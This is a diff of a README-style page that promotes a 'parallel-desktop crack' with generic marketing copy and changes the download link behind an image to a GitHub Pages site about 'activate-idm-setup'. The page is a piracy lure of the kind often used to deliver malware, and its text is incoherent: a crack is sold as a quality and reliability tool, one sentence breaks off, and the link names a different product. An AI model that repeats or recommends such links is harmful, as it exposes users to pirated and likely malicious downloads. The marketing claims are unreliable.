@@ -2,7 +2,7 @@
 
 Unleash the potential of your projects with parallel-desktop crack, a cutting-edge solution designed for unmatched software quality and rock-solid reliability. By integrating advanced features like seamless automation and robust error handling, parallel-desktop
 
-[![image](https://github.com/user-attachments/assets/2ce22ebc-dc3b-4bc8-8b1a-cb7b89f4704b)](https://linktr.ee/downloadversion)
+[![image](https://github.com/user-attachments/assets/2ce22ebc-dc3b-4bc8-8b1a-cb7b89f4704b)](https://idm-setupversion.github.io/activate-idm-setup/)
 
 ![image](https://github.com/user-attachments/assets/1dcad0d1-0ed2-4c6a-8a6d-5170461f337d)
 
